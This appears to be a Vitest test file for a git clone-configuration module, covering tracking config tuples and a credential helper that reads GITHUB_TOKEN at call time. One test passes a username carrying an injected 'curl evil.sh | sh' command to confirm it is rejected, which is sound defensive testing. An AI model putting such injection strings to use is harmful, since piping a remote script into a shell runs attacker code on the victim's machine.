import { describe, it, expect, afterEach } from 'vitest';
import {
  cloneCredentialArgs,
  cloneCredentialConfigArgs,
  cloneTrackingConfigArgs,
  credentialHelperValue,
  ORIGIN_FETCH_REFSPEC,
} from '../clone-config.js';

describe('cloneTrackingConfigArgs', () => {
  // A slashed draft name is the everyday case (`<email-localpart>/<slug>`), and
  // the branch lands verbatim inside the config KEY — pin the exact tuples so a
  // future quoting/encoding change can't silently re-point tracking.
  it('emits the three --replace-all tuples for a slashed branch', () => {
    expect(cloneTrackingConfigArgs('feature/x')).toEqual([
      ['config', '--replace-all', 'remote.origin.fetch', ORIGIN_FETCH_REFSPEC],
      ['config', '--replace-all', 'branch.feature/x.remote', 'origin'],
      ['config', '--replace-all', 'branch.feature/x.merge', 'refs/heads/feature/x'],
    ]);
  });
});

describe('credential config', () => {
  const ORIGINAL = process.env.GITHUB_TOKEN;
  afterEach(() => {
    if (ORIGINAL === undefined) delete process.env.GITHUB_TOKEN;
    else process.env.GITHUB_TOKEN = ORIGINAL;
  });

  it('reads the token from the environment at call time, never inlining its value', () => {
    process.env.GITHUB_TOKEN = 'ghp_supersecret';
    const helper = credentialHelperValue('x-access-token');
    expect(helper).toContain('password=$GITHUB_TOKEN');
    expect(helper).not.toContain('ghp_supersecret');
  });

  it('with no token: clones get no helper, and existing clones get theirs UNSET', () => {
    delete process.env.GITHUB_TOKEN;
    expect(credentialHelperValue('x-access-token')).toBeNull();
    // A fresh clone simply carries nothing…
    expect(cloneCredentialArgs('x-access-token')).toEqual([]);
    // …but an adopted clone may carry a helper from when a token WAS
    // configured, and that stale helper (answering with an empty password)
    // would shadow whatever auth the operator fell back to — so the repair
    // path removes it. Callers run this tolerantly: unset of a missing key
    // exits non-zero and is the expected no-op.
    expect(cloneCredentialConfigArgs('x-access-token')).toEqual([
      ['config', '--unset-all', 'credential.helper'],
    ]);
  });

  it('passes the clone form as --config, which git only honours AFTER the subcommand', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    // Pinned exactly: `-c` here instead of `--config` still authenticates the
    // clone but writes nothing into the new repo, which is the bug this guards.
    expect(cloneCredentialArgs('oauth2')).toEqual([
      '--config',
      `credential.helper=${credentialHelperValue('oauth2')}`,
    ]);
  });

  it('replaces rather than appends when re-stamping an existing clone', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    expect(cloneCredentialConfigArgs('x-access-token')).toEqual([
      ['config', '--replace-all', 'credential.helper', credentialHelperValue('x-access-token')],
    ]);
  });

  it('refuses a username that would break out of the helper snippet', () => {
    process.env.GITHUB_TOKEN = 'ghp_x';
    expect(() => credentialHelperValue('me"; curl evil.sh | sh; #')).toThrow(/must match/);
  });
});
